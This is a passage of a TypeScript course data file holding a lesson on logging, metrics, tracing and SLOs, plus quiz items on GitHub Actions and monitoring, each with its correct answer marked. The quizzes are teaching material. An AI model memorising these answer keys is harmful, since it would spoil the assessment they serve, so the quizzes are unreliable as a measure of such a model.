            "Tags are mutable, so a compromised maintainer account can repoint them at malicious code, as happened to `tj-actions/changed-files` in March 2025",
            "SHAs make workflows run faster because they skip version resolution",
            "GitHub requires SHA pins for actions from the Marketplace",
            "Tags stop working once a newer major version is released",
          ],
          correctIndex: 0,
          explanation:
            "A full-length SHA is the only immutable reference to an action's code. Tools like Dependabot can keep SHA pins updated, so you don't give up upgrades.",
        },
        {
          id: "ops-ci-cd-github-actions-q12",
          prompt:
            "A release workflow pushes a tag using `GITHUB_TOKEN`, expecting the `on: push: tags` deploy workflow to start. It never does. Why?",
          options: [
            "Events caused by `GITHUB_TOKEN` don't create new workflow runs (apart from `workflow_dispatch` and `repository_dispatch`), which prevents recursive runs",
            "Tag pushes never trigger workflows",
            "The deploy workflow needs `permissions: contents: write` to be triggered",
            "Workflows can only be triggered by commits, not by tags",
          ],
          correctIndex: 0,
          explanation:
            "This guard stops workflows from triggering themselves endlessly. Call the deploy workflow directly (`workflow_call` or `workflow_dispatch`), or push with a GitHub App token when a real trigger is needed.",
        },
      ],
    },
    {
      id: "ops-logging-monitoring",
      moduleId: "be-testing-ops",
      trackId: "backend",
      title: "Logging & Monitoring Fundamentals",
      summary:
        "Logs, metrics and traces answer different questions. Metrics are cheap numeric time series you alert on (is it broken, and how badly?), traces follow one request across services (where did the time go?), and logs record individual events with context (what exactly happened?). You want all three, correlated by IDs, so an alert leads straight to the traces and logs behind it. OpenTelemetry is the vendor-neutral way to produce them: its Node SDK auto-instruments Express, HTTP clients and database drivers, and propagates context between services in the W3C `traceparent` header.\n\nWrite logs as structured JSON to stdout, one event per line, with stable field names (`level`, `time`, `msg`, `requestId`, `traceId`, `route`, `durationMs`) so they can be queried instead of grepped; Pino is the fast default in Node. Accept or generate a request ID at the edge, return it in a response header and attach it to every line through a child logger or `AsyncLocalStorage`. Log error objects, not just `err.message`. Use levels deliberately (`error` means someone should look), and redact secrets by key (`authorization`, `cookie`, `password`, tokens) before anything is written: logs are copied into many systems and kept for months, so a token in a log is a leaked credential.\n\nFor metrics, RED (rate, errors, duration) fits request-driven services and USE (utilization, saturation, errors) fits resources such as CPU, connection pools and queues. Record latency as histograms, alert on percentiles rather than averages, and keep label values bounded: a `userId` or raw-URL label creates a time series per value. Alerts should flow from SLOs. An SLI (the share of requests served successfully in under 300 ms) with a 99.9% target over 30 days leaves an error budget of 0.1%, about 43 minutes of full outage, and burn-rate alerts page when you're spending it too fast rather than on every blip.",
      level: "advanced",
      estMinutes: 75,
      webRefs: [
        { label: "OpenTelemetry: Traces", url: "https://opentelemetry.io/docs/concepts/signals/traces/", kind: "docs" },
        { label: "Google SRE Book: Service Level Objectives", url: "https://sre.google/sre-book/service-level-objectives/", kind: "article" },
        { label: "Prometheus: Metric and label naming", url: "https://prometheus.io/docs/practices/naming/", kind: "docs" },
        { label: "OWASP: Logging Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html", kind: "article" },
      ],
      video: {
        title: "12 Logging BEST Practices in 12 minutes",
        channel: "Better Stack",
        url: "https://www.youtube.com/watch?v=I2mWnh66Bkg",
        videoId: "I2mWnh66Bkg",
        durationLabel: "12:00",
      },
      alternateVideos: [
        {
          title: "The RED Method: How To Instrument Your Services",
          channel: "Grafana",
          url: "https://www.youtube.com/watch?v=zk77VS98Em8",
          videoId: "zk77VS98Em8",
          durationLabel: "20:19",
        },
        {
          title: "What is OTel? | OTel for Beginners - The JavaScript Journey",
          channel: "OpenTelemetry",
          url: "https://www.youtube.com/watch?v=iEEIabOha8U",
          videoId: "iEEIabOha8U",
          durationLabel: "9:11",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "ops-logging-monitoring-q1",
          prompt: "Which labels are safe on an `http_request_duration_seconds` histogram? (Select all that apply.)",
          options: [
            "`method`",
            "`route`, as the template (`/users/:id`)",
            "`status_code`",
            "`user_id`",
            "The raw request path, such as `/users/84213`",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Every distinct combination of label values is a separate time series, multiplied by every histogram bucket. Unbounded values like user ids or raw paths explode cardinality and can take down the metrics backend; put them in logs or trace attributes instead.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-logging-monitoring-q2",
          prompt: "Roughly how much complete downtime does a 99.9% availability SLO allow over a 30-day window?",
          options: ["About 43 minutes", "About 4.3 minutes", "About 7.2 hours", "About 8.8 hours"],
          correctIndex: 0,
          explanation:
            "30 days is 43,200 minutes, and 0.1% of that is 43.2. Of the distractors, 4.3 minutes is 99.99%, 7.2 hours is 99% over 30 days, and 8.8 hours is 99.9% over a whole year.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-logging-monitoring-q3",
          prompt:
            "A service has a 99.9% SLO over 30 days. For one hour, its error rate jumps to 1.44%. What share of the 30-day error budget did that hour consume?",
          options: ["2%", "1.44%", "14.4%", "0.2%"],
          correctIndex: 0,
          explanation:
            "1.44% errors against a 0.1% budget is a burn rate of 14.4, and one hour is 1/720 of 30 days, so 14.4 / 720 = 2%. That's the Google SRE Workbook's suggested fast-burn paging threshold (14.4x over one hour).",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-logging-monitoring-q4",
          prompt:
            "What's the main problem with this middleware?\n\n```js\napp.use(express.json());\napp.use((req, res, next) => {\n  logger.info({ headers: req.headers, body: req.body }, 'incoming request');\n  next();\n});\n```",
          options: [
            "It writes `authorization` headers, session cookies and login passwords into logs that are widely copied and retained",
            "Nothing, provided logs are shipped over TLS",
            "JSON loggers can't serialise request headers",
            "It only matters in development, because production loggers drop request bodies",
          ],
          correctIndex: 0,
          explanation:
            "Log pipelines fan out to vendors, backups and dashboards with far broader access than your database. Allowlist the fields you log, or redact by path (Pino's `redact` option, for example `req.headers.authorization`, `req.headers.cookie`, `*.password`).",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-logging-monitoring-q5",
          prompt: "Which are good structured-logging practices for a Node API? (Select all that apply.)",
          options: [
            "Write one JSON object per line to stdout and let the platform ship it",
            "Put the request ID (and trace ID) on every line produced while handling a request",
            "Log the error object itself so the stack and `cause` are captured",
            "Build messages by concatenation, like `'user ' + id + ' failed'`, so they read well",
            "Run at `debug` level in production so nothing is ever missed",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Structured fields are queryable and correlatable, and stdout keeps the app out of log shipping. Values baked into a message string can't be filtered, and production `debug` logging costs money and buries the signal.",
        },
        {
          id: "ops-logging-monitoring-q6",
          prompt: "A service function deep in the call stack never receives `req`. How should its log lines get the current request ID?",
          options: [
            "Store it in an `AsyncLocalStorage` context (or the OpenTelemetry context) in middleware, and have the logger read it",
            "Set a module-level `currentRequestId` variable in middleware",
            "Write it to `process.env.REQUEST_ID` at the start of each request",
            "Read it from the socket's remote port",
          ],
          correctIndex: 0,
          explanation:
            "`AsyncLocalStorage` follows the async chain of each request, so concurrent requests keep separate values. A module-level variable or `process.env` is shared by every in-flight request, so lines get tagged with the wrong ID under load.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-logging-monitoring-q7",
          prompt: "Which pairing of monitoring method and target is right?",
          options: [
            "RED (rate, errors, duration) for the checkout API; USE (utilization, saturation, errors) for the database connection pool",
            "USE for the checkout API; RED for the connection pool",
            "RED for CPU cores; USE for HTTP endpoints",
            "Both methods only apply to Kubernetes clusters",
          ],
          correctIndex: 0,
          explanation:
            "RED describes the experience of a request-driven service's callers. USE describes a resource: how busy it is, how much work is queued waiting for it, and its errors. Pool saturation (requests waiting for a connection) often explains a RED latency spike.",
        },
        {
          id: "ops-logging-monitoring-q8",
          prompt: "Why alert on p99 latency computed from histograms, rather than on the mean?",
          options: [
            "The mean hides the slow tail that real users hit, and histogram buckets can be aggregated across instances while per-instance percentiles can't be averaged",
            "Percentiles are cheaper to store than averages",
            "Latency is normally distributed, so the mean and p99 are always close",
            "p99 alerts fire less often, which keeps on-call quiet",
          ],
          correctIndex: 0,
          explanation:
            "Latency is long-tailed, so a healthy mean can coexist with a terrible p99, and a user making many requests will hit the tail. Averaging p99s from ten pods produces a number with no meaning; summing bucket counts first does not have that problem.",
        },
        {
          id: "ops-logging-monitoring-q9",
          prompt: "Which event deserves the `error` level in an HTTP API's logs?",
          options: [
            "An unhandled exception that produced a 500 response",
            "A 404 for a product id that doesn't exist",
            "A failed login with a wrong password",
            "A client sending malformed JSON (a 400)",
          ],
          correctIndex: 0,
          explanation:
            "`error` should mean the service failed and someone may need to act. Client mistakes are normal traffic: log them at `info` or `warn` (failed logins as security audit events) and alert on unusual rates, not on individual events.",
        },
        {
          id: "ops-logging-monitoring-q10",
          prompt: "What does the W3C `traceparent` header carry from one service to the next?",
          options: [
            "The trace ID, the parent span ID and sampling flags, so the next service's spans join the same trace",
            "The complete list of spans recorded so far",
            "The user's session token",
            "The log lines emitted upstream",
          ],
          correctIndex: 0,
          explanation:
            "`traceparent` looks like `00-<32-hex trace id>-<16-hex parent span id>-<flags>`. Span data itself is exported separately to a collector; only the small context travels with the request.",
        },
        {
          id: "ops-logging-monitoring-q11",
          prompt: "Head-based sampling keeps 1% of traces, decided when each trace starts. What's the tradeoff compared with tail-based sampling?",
          options: [
            "Head sampling is cheap but keeps a random 1%, so rare errors and slow requests are usually dropped; tail sampling keeps them by deciding after the trace completes, at the cost of buffering spans in a collector",
            "Head sampling keeps every error trace automatically",
            "Tail sampling needs no extra infrastructure",
            "There's no tradeoff: both keep the same traces",
          ],
          correctIndex: 0,
          explanation:
            "The traces you most want (errors, the slowest 0.1%) are exactly what a random upfront decision misses. Tail sampling in the OpenTelemetry Collector can keep all of those plus a small baseline, but the collector must hold every span until each trace is complete.",
        },
        {
          id: "ops-logging-monitoring-q12",
          prompt: "Which of these should page an on-call engineer at 3 a.m.?",
          options: [
            "The error budget burning at 14.4x over both the last hour and the last 5 minutes",
            "CPU above 80% on any single instance for one minute",
            "Any single 500 response",
            "Disk usage on a replica above 50%",
          ],
          correctIndex: 0,
          explanation:
            "Page on symptoms users feel, at a rate that threatens the SLO; the short window confirms the problem is still happening. Resource thresholds and one-off errors belong on dashboards or in tickets, or they train people to ignore the pager.",
        },
      ],
    },
  ],
} satisfies Module;
